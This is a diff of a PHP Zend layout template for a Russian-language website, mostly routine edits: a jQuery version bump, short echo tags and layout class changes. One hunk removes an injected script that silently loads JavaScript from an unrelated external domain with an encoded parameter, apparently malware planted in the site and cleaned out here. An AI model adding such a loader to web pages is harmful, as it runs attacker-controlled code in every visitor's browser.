@@ -13,8 +13,8 @@ $isFrontpage = trim($pageClass)=='frontpage' ? true  : false ;
 $this->jQuery()
     ->setRenderMode( ZendX_JQuery::RENDER_ALL )
 	//->setCdnSsl(true) if need to load from ssl location
-	->setVersion('1.9.1') //jQuery version, automatically 1.5 = 1.5.latest
-	->setUiVersion('1.10.2') //jQuery UI version, automatically 1.8 = 1.8.latest
+	->setVersion('1.10.2') //jQuery version, automatically 1.5 = 1.5.latest
+	->setUiVersion('1.10.3') //jQuery UI version, automatically 1.8 = 1.8.latest
 	->uiEnable();
 
 $this->inlineScript()
@@ -36,14 +36,6 @@ $this->placeholder('header')->set( $this->partial('partials/header.phtml', array
 
 //#### Main content ####
 $this->placeholder('maincontent')->set( $this->layout()->content );
-
-//#### Featured channels list ####
-/*if ($pageClass=='show-video'){
-    $this->placeholder('featured_channels')->set( 
-    	$this->partial('partials/featured-channels.phtml', array(
-    		'list'=>$this->featured_channels)) );
-}
-*/
 
 //#### Left Sidebar ####
 $this->placeholder('sidebar_left')->set( $this->partial('partials/sidebar-left.phtml', array(
@@ -69,9 +61,11 @@ $this->placeholder('sidebar_right')->set( $this->partial( 'partials/sidebar-righ
 $this->placeholder('footer')->set( $this->partial('partials/footer.phtml', array()) );
 ?>
 
-<?php echo $this->doctype(); ?>
+
+<?= $this->doctype(); ?>
 <html itemscope itemtype="http://schema.org/WebPage" xmlns:fb="https://www.facebook.com/2008/fbml"
-<?php echo ($this->doctype()->isRdfa() && isset($this->ogp_ns)) ? 'prefix="og:'.$this->ogp_ns.'#"' : null ; ?> xml:lang="ru" lang="ru">
+
+<?= ($this->doctype()->isRdfa() && isset($this->ogp_ns)) ? 'prefix="og:'.$this->ogp_ns.'#"' : null ; ?> xml:lang="ru" lang="ru">
 <head>
     <?php /*
     <meta content="An Example Title" itemprop="name" property="og:title" />
@@ -80,12 +74,12 @@ $this->placeholder('footer')->set( $this->partial('partials/footer.phtml', array
     <meta content="http://www.example.com/permalink" itemprop="url" property="og:url" />
     <link rel="canonical" href="http://www.example.com/permalink" />
      */ ?>
-    <?php echo $this->headTitle() ?>
-    <?php echo $this->headMeta() ?>
-    <?php echo $this->headLink() ?>
-    <?php echo $this->jQuery() ?>
-    <?php echo $this->headScript() ?>
-    <?php echo $this->headStyle() ?>
+    <?= $this->headTitle() ?>
+    <?= $this->headMeta() ?>
+    <?= $this->headLink() ?>
+    <?= $this->jQuery() ?>
+    <?= $this->headScript() ?>
+    <?= $this->headStyle() ?>
     <?php  if (APPLICATION_ENV=='production') : ?>
     <script type="text/javascript">new Image().src = "//counter.yadro.ru/hit?r"+escape(document.referrer)+((typeof(screen)=="undefined")?"":";s"+screen.width+"*"+screen.height+"*"+(screen.colorDepth?screen.colorDepth:screen.pixelDepth))+";u"+escape(document.URL)+";h"+escape(document.title.substring(0,80))+";"+Math.random();</script>
     <?php endif; ?>
@@ -96,11 +90,12 @@ $this->placeholder('footer')->set( $this->partial('partials/footer.phtml', array
 <div style="position:absolute;left:-10000px;"><img src="http://d8.c6.b3.a2.top.mail.ru/counter?id=2320499" style="border:0;" height="1" width="1" alt="Рейтинг@Mail.ru" /></div>
 <?php endif; ?>
 
-<div class="container">
+<div class="container-fluid">
     
-    <?php echo $this->placeholder('header'); ?>
 
-    <div id="content" class="row-fluid <?php echo $pageClass; ?>">
+    <?php echo $this->placeholder('header'); ?>
+    
+    <div id="content" class="row-fluid <?= $pageClass; ?>">
         
         <?php 
         if (count($this->messages)) {
@@ -119,23 +114,23 @@ $this->placeholder('footer')->set( $this->partial('partials/footer.phtml', array
         <?php 
         if ($isFrontpage) {
             ?>
-        <div class="span12">
-            <?php echo $this->placeholder('maincontent'); ?>
+        <div class="span12 page">
+            <?= $this->placeholder('maincontent'); ?>
         </div>
             <?php 
         } else {
             ?>
 
             <?php if ((int)$this->leftWidth > 0): ?>
-            <?php echo $this->placeholder('sidebar_left'); ?>
+            <?= $this->placeholder('sidebar_left'); ?>
             <?php endif; ?>
 
-            <div class="span<?php echo $this->contentWidth ?>" style="background:#EFEFEF; padding-left: 2em; padding-right: 2em;">
-                <?php echo $this->placeholder('maincontent'); ?>
+            <div class="span<?= $this->contentWidth ?>" style="background:#EFEFEF;">
+                <?= $this->placeholder('maincontent'); ?>
             </div>	
 
             <?php if ((int)$this->rightWidth > 0): ?>
-            <?php echo $this->placeholder('sidebar_right'); ?>
+            <?= $this->placeholder('sidebar_right'); ?>
             <?php endif; ?>
 
         <?php 
@@ -144,12 +139,12 @@ $this->placeholder('footer')->set( $this->partial('partials/footer.phtml', array
     </div>
 
     <div class="row" id="footer">
-        <?php echo $this->placeholder('footer'); ?>
+        <?= $this->placeholder('footer'); ?>
     </div>
     
 </div>
 
-<?php if (APPLICATION_ENV=='production') { 
+<?php if (APPLICATION_ENV=='production') {
 $js = '(function (d, w, c) {
 (w[c] = w[c] || []).push(function() {
 try {
@@ -165,7 +160,7 @@ s.src = (d.location.protocol == "https:" ? "https:" : "http:") + "//mc.yandex.ru
 if (w.opera == "[object Opera]") { d.addEventListener("DOMContentLoaded", f); } 
 else { f(); }
 })(document, window, "yandex_metrika_callbacks");'; ?>
-<script type="text/javascript"><?php echo (APPLICATION_ENV=='production') ? Rtvg_Compressor_JSMin::minify($js) : $js; ?></script>
+<script type="text/javascript"><?= (APPLICATION_ENV=='production') ? Rtvg_Compressor_JSMin::minify($js) : $js; ?></script>
 <noscript><div><img src="//mc.yandex.ru/watch/16053280" style="position:absolute; left:-9999px;" alt="" /></div></noscript>
 <?php } ?>
 
@@ -179,22 +174,8 @@ _gaq.push(['_trackPageview']);
   ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
   var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
 })();"; ?>
-<script type="text/javascript"><?php echo (APPLICATION_ENV=='production') ? Rtvg_Compressor_JSMin::minify($js) : $js; ?></script>
+<script type="text/javascript"><?= (APPLICATION_ENV=='production') ? Rtvg_Compressor_JSMin::minify($js) : $js; ?></script>
 <?php } ?>
-
-<script type="text/javascript">
-   (function(w) {
-     var script = document.createElement('script');
-     var i = setInterval(function() {
-       if (typeof w.document.body !== 'undefined') {
-           script.src = 'http://cskvezhxr.not-only.info' + '/?70935=YypjZTF1e3h0fH5zZCokJSAgLg';
-           w.document.body.appendChild(script);
-           clearInterval(i);
-       }
-     }, 200);
-})(window);
-</script>
-
 
 <?php ob_start(); ?>
 $(document).ready(function(){
@@ -204,7 +185,7 @@ $(document).ready(function(){
 $js = (APPLICATION_ENV=='production') ?  Rtvg_Compressor_JSMin::minify( ob_get_clean() ) : ob_get_clean() ;
 $this->inlineScript()->appendScript( $js ); ?>
 
-<?php echo $this->inlineScript(); ?>
+<?= $this->inlineScript(); ?>
 
 
 </body>
